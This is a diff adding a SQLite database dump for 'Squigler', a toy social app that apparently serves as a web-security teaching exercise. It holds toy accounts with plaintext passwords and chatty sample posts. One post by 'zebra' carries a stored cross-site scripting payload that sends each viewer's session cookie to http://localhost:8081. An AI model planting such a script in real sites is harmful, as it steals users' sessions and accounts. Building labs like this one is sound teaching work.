@@ -1,0 +1,51 @@
+PRAGMA foreign_keys=OFF;
+BEGIN TRANSACTION;
+CREATE TABLE accounts (username string primary key, password string, public boolean default 'f');
+INSERT INTO "accounts" VALUES('arel','cool','t');
+INSERT INTO "accounts" VALUES('alice','kindacool','f');
+INSERT INTO "accounts" VALUES('bob','notcool','t');
+INSERT INTO "accounts" VALUES('cathy','yhtac','t');
+INSERT INTO "accounts" VALUES('dilbert','funny','t');
+INSERT INTO "accounts" VALUES('spy_dilbert','secret','f');
+INSERT INTO "accounts" VALUES('ethan','ethanspassword','t');
+INSERT INTO "accounts" VALUES('fritter','goodeats','t');
+INSERT INTO "accounts" VALUES('frank','furter','f');
+INSERT INTO "accounts" VALUES('zebra','zeeisfor','t');
+CREATE TABLE sessions (session_id primary key, username string, time datetime);
+INSERT INTO "sessions" VALUES('605921305','dilbert','2019-01-27 21:54:18');
+CREATE TABLE squigs (username string, body text, time datetime);
+INSERT INTO "squigs" VALUES('arel','I am going to go to class soon... but first I wanna get some food at the Euclid. Who coming? ','2017-02-02 15:50:47');
+INSERT INTO "squigs" VALUES('arel','Oh, I just forgot something... I will need a few more minutes. I think @bob wanted me to bring something. ','2017-02-02 15:51:52');
+INSERT INTO "squigs" VALUES('arel','Why is it that all of the sudden I stopped using contractions or apostrophes quotes or other escape characters in my English? Funny!','2017-02-02 15:52:43');
+INSERT INTO "squigs" VALUES('bob','@arel you said you were going to the Euclid? I love the Euclid! I will be there but can you bring my book? It is a diary, actually. It belongs to @alice, do not tell her! I am a bad person are not I?','2017-02-02 16:11:03');
+INSERT INTO "squigs" VALUES('bob','@arel I am going to south side for some burgers... haha I almost said barbers... I do not need any barbers. I am so unfunny!','2017-02-02 16:11:04');
+INSERT INTO "squigs" VALUES('cathy','@bob you kid yourself. You are so funny! Just not today.','2017-02-02 16:11:05');
+INSERT INTO "squigs" VALUES('bob','@cathy is spot on I am really not funny, but you should try writing mass squigs. I am sqigged out.','2017-02-02 16:11:06');
+INSERT INTO "squigs" VALUES('spy_dilbert','I think tweets should never be published verbatim in the New York Times. Squigs, on the other hand, go at em!','2017-02-02 16:11:08');
+INSERT INTO "squigs" VALUES('dilbert','Am I philosophical because I like phyllo dough?','2017-02-02 16:11:09');
+INSERT INTO "squigs" VALUES('spy_dilbert','I am going to break into that secret tunnel down town! Do not tell people! This is super secret. I am so glad Squigler is secure!','2017-02-02 16:11:10');
+INSERT INTO "squigs" VALUES('ethan','In D.C. having a good time without you guys!','2017-02-02 16:11:11');
+INSERT INTO "squigs" VALUES('ethan','Booooorrrreed. My hotel has no HBO.','2017-02-02 16:11:12');
+INSERT INTO "squigs" VALUES('fritter','Cooked fritters are the best. Do not cook me though... haha','2017-02-02 16:12:03');
+INSERT INTO "squigs" VALUES('frank','Jeez why do not we go to get more food stuff on the Euclid. Maybe hamburgers? Or Indian Chipole?','2017-02-02 16:13:03');
+INSERT INTO "squigs" VALUES('zebra','I like stripes. And Zebras. And hamburgers. And Euclid. And The Euclid. And lunch. And writing. And conjunctions. And also the secret writings of @spy_dilbert and @alice.','2017-02-02 16:14:03');
+INSERT INTO "squigs" VALUES('bob','@zebra you are nuts man, but you do not have anything on the @alice over there. She is the nuts nuts! ','2017-02-02 16:21:03');
+INSERT INTO "squigs" VALUES('cathy','Did they not have a comic strip about me? I feel like they did... The Far Side?','2017-02-02 16:25:03');
+INSERT INTO "squigs" VALUES('dilbert','Man! Writing nonsense makes the time pass quickly.','2017-02-02 16:33:03');
+INSERT INTO "squigs" VALUES('alice','Sandwiches or hamburgers then?','2017-02-02 16:42:03');
+INSERT INTO "squigs" VALUES('arel','I got your book @bob. Heading downstairs.','2017-02-02 16:44:03');
+INSERT INTO "squigs" VALUES('bob','Sheep are so wooly. Like mammoths of pasture!','2017-02-02 16:45:03');
+INSERT INTO "squigs" VALUES('bob','I should not write when I am sleep deprived.','2017-02-02 16:48:03');
+INSERT INTO "squigs" VALUES('zebra','OK guys let us roll!','2017-02-02 16:49:03');
+INSERT INTO "squigs" VALUES('zebra','Hehehe... nothing to see here. <img id="hahaha" name="hahaha" src="" width=0 height =0 /> (unless you look at the source code...) Are you logged in? MuHAHhahahHAHhahhahhha!
+
+<script>
+// but here there is a lot to see! >:)
+document.hahaha.src="http://localhost:8081/post?note=I observed the session cookie " + encodeURIComponent(document.cookie);
+</script>','2017-02-02 16:50:03');
+INSERT INTO "squigs" VALUES('alice','@spy_dilbert and @arel... are we breaking into the tunnel tonight or what?','2017-02-02 16:51:03');
+INSERT INTO "squigs" VALUES('spy_dilbert','I guess squiggler.com was already taken?','2017-02-02 16:32:03');
+INSERT INTO "squigs" VALUES('ethan','hello stuff','2018-02-01 18:03:27');
+INSERT INTO "squigs" VALUES('ethan','hello party','2018-02-01 18:04:01');
+INSERT INTO "squigs" VALUES('ethan','hello stuff','2018-02-01 18:04:25');
+COMMIT;
